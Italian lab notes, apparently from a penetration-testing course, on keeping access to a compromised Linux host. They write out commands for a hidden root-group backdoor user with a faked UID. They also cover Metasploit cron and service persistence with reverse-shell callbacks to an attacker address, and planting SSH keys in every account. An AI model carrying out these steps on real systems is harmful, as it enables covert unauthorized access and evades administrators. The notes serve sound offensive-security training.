# Establishing Persistence On Linux

<figure><img src="../../../.gitbook/assets/image (35).png" alt=""><figcaption></figcaption></figure>

Le distro linux possono avere diversi metodi per stabilire persistenza, quindi è importante sapere la distro del OS del target.

## Accesso iniziale

Useremo l'accesso via SSH con credenziali fornite via modulo ssh\_login, e poi sfrutteremo la vulnerabilità chkrootkit vista nella lezione "Exploiting A Vulnerable Program" per fare privilege escalation e ottenere accesso come root.

<figure><img src="../../../.gitbook/assets/image (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (2) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (3) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (6) (1) (1).png" alt=""><figcaption></figcaption></figure>

## Creare un backdoor user per avere accesso a piacere

```shell
bash
/bin/bash -i
cat /etc/passwd //per vedere quali utenti esistono sul sistema
//l'utente creato dovrebbe nascondersi ed essere difficile da individuare, quindi simile a un service account
useradd -m /var/www/html ftp -s /bin/sbin/nologin //specifichiamo la home directory come /var/www ma non è necessario, possiamo lasciare vuoto. Poi il nome utente (ftp) e infine con -s impostiamo l'actual terminal session (in questo caso è quella data agli user service, per nasconderci meglio.
passwd ftp //impostiamo la password di ftp
groups root
usermod -aG root ftp //aggiungiamo ftp al gruppo root
groups ftp
usermod -u 15 ftp //per modificare l'id dell'utente per non far capire che lo abbiamo creato manualmente
```

<figure><img src="../../../.gitbook/assets/image (7) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (8) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (9) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (10) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (11) (1).png" alt=""><figcaption></figcaption></figure>

è possibile fare anche altre cose per avere persistenza: aggiungere una chiave SSH per un utente in modo da potersi connettere da remoto, creare un servizio con un cronjob.

## Guardiamo i moduli persistence disponibili per Linux

```
search platform:linux persistence
```

<figure><img src="../../../.gitbook/assets/image (12) (1).png" alt=""><figcaption></figcaption></figure>

### APT Package Manager Persistence Module

```
use exploit/linux/local/apt_package_manager_persistence
show options
info
// Ma in questo caso dobbiamo fare affidamento sul fatto che venga eseguito il packet manager, non potremmo connetterci quando vogliamo.

```

<figure><img src="../../../.gitbook/assets/image (13) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (14) (1).png" alt=""><figcaption></figcaption></figure>

### Cron Persistence Module

Crea un cronjob che costantemente tenta di connettersi ad un nostro handler che dovremmo predisporre in ascolto.

I cronjobs possono essere però facilmente visti e cancellati da un amministratore legittimo.

```
use exploit/linux/local/cron_persistence
show options
set SESSION 4
set LPORT 4422
set LHOST 192.182.80.2 //(eth1)
exploit //ma pare non funzioni
```

<figure><img src="../../../.gitbook/assets/image (15) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (16) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (17) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (18) (1).png" alt=""><figcaption></figcaption></figure>

### Service Persistence Module

Crea un servizio e lo marca come auto-restart. Ma è valido solo per alcune versioni di OS e bisogna avere permessi sufficienti:

<figure><img src="../../../.gitbook/assets/image (22) (1).png" alt=""><figcaption></figcaption></figure>

```
use exploit/linux/local/service_persistence
show options
set SESSION 4
set payload cmd/unix/reverse_python
show options
set LHOST 192.182.80.2
set LPORT 4422
exploit //in questo caso fallisce
set target 3 //per settare a systemd invece che system V
exploit // funziona parzliamente, non crea la sessione
set target 4 //proviamo con systemd user
exploit // anche in questo caso non crea la sessione
```

<figure><img src="../../../.gitbook/assets/image (19) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (20) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (21) (1).png" alt=""><figcaption></figcaption></figure>

## SSH Key Persistence

Metodo consigliato per garantire persistenza.

Il modulo funziona in questo modo: imposta una chiave private e public ssh key pair, e aggiunge la public key nella home directory di tutti gli account sul sistema, poi ci fornisce la private key e in questo modo è possibile con la private key effettuare l'accesso a qualsiasi account senza mai fornire la password.

Questo metodo è difficile da individuare perché la chiave pubblica SSH che è stata aggiunta nella home directory dell'utente non è qualcosa che è acceduta spesso. Quindi è difficile che l'utente se ne accorga. Non lascia artefatti come processi, cronjobs, utenti. L'unica cosa sospetta sono i log di accesso come utente, ma se anche loro accedono periodicamente magari non ci fanno caso.

```
use post/linux/manage/sshkey_persistence
show options
set CREATESSHFOLDER true //perché in alcuni casi l'utente potrebbe non avere la cartella per SSH già presente
set SESSION 4
info
exploit //ha creato le chiavi ssh per tutti gli utenti, inclusi i service users.
loot //per trovare la private key che ci ha generato e salvato in un file
cat <FilePrivateKey>
//copiamo la chiave e la utilizziamo per accedere
exit -y
vim ssh_key // e incolliamo la chiave privata in questo file
chmod 0400 ssh_key
ssh -i ssh_key root@192.182.80.3 //<target ip address>
//abbiamo ora accesso al target come root e senza dover fornire password
ls
whoami
exit
ssh -i ssh_key ftp@192.182.80.3 // e funziona anche per accedere all'utente ftp
```

<figure><img src="../../../.gitbook/assets/image (23) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (24) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (25) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (26) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (27) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (28) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (30) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (29) (1).png" alt=""><figcaption></figcaption></figure>
